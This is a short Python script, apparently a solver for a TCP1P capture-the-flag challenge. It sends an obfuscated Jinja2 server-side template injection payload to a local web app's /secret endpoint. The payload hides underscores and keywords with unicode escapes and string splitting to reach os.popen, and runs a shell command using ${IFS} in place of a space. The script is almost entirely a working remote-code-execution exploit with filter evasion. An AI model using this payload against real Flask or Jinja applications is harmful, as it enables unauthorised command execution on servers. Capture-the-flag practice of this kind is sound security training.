import requests
from bs4 import BeautifulSoup

# url = 'http://ctf.tcp1p.team:10012'
url = 'http://127.0.0.1:23678'

headers = {
    'Accept-Language': 'en-US',
    'Upgrade-Insecure-Requests': '1',
    'Connection': 'keep-alive',
    'Accept-Encoding': 'identity',

}

param = {'url':'secret?admin=/about/'}
data = {'admin':'{{7*7}}'}

response = requests.get(url+'/secret?admin={% set a = request|attr("appli"+"cation")|attr("\u005f\u005fglo"+"bals\u005f\u005f")|attr("\u005f\u005fget"+"item\u005f\u005f")("\u005f\u005fbuil"+"tins\u005f\u005f")|attr("\u005f\u005fgeti"+"tem\u005f\u005f")("\u005f\u005fimp"+"ort\u005f\u005f")("o"+"s")|attr("po"+"pen")("ls${IFS}-l")|attr("re"+"ad")() %}{{ a }}', headers=headers)
print(response.text)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, 'html.parser')

    title = soup.title.string if soup.title else 'No Title Found'
    print(f"Title: {title}")

    body_text = soup.body.get_text(separator='\n', strip=True) if soup.body else 'No Body Found'
    print("\nBody Text:\n")
    print(body_text)
else:
    print(f"Error: {response.status_code}")
